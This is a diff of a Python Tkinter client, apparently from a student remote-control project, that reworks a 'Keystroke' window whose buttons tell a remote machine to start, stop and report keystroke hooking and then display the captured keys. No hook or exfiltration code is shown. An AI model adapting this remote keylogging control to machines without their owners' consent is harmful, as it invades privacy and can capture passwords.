@@ -188,8 +188,9 @@ def Registry():
 def Keystroke():
     newApp = Tk()
     newApp.geometry("500x300")
-    newApp.title("Keystroke")
-   
+    newApp.title("Keystroke")  
+    e = Entry(newApp, width = 55)
+    e.grid(row = 1, column = 0,columnspan= 4)
     def hook():
         client.sendall(bytes("Hook Key","utf8"))
         check = client.recv(1024).decode("utf8")
@@ -197,14 +198,15 @@ def Keystroke():
         nonlocal size, string
         client.sendall(bytes("Unhook Key","utf8"))
         size , string = Recieve_Hook(client, HOST, PORT)
+
     def xem():
+        client.sendall(bytes("Xem key","utf8"))
+        size , string = Recieve_Hook(client, HOST, PORT)
         e.delete(0,END)
-        e.insert(0,data)
+        e.insert(0,string)
     def xoa():
         e.delete(0,END)
 
-    e = Entry(newApp, width = 55)
-    e.grid(row = 1, column = 0,columnspan= 4)
     Hook = Button(newApp, text = "Hook", padx = 20, pady = 20, command = hook).grid(row = 0,column = 0)
     unHook = Button(newApp, text = "Unhook", padx = 20, pady = 20, command = unhook).grid(row = 0,column = 1) 
     inphim = Button(newApp, text = "In phím", padx = 20, pady = 20,command = xem).grid(row = 0,column = 2)
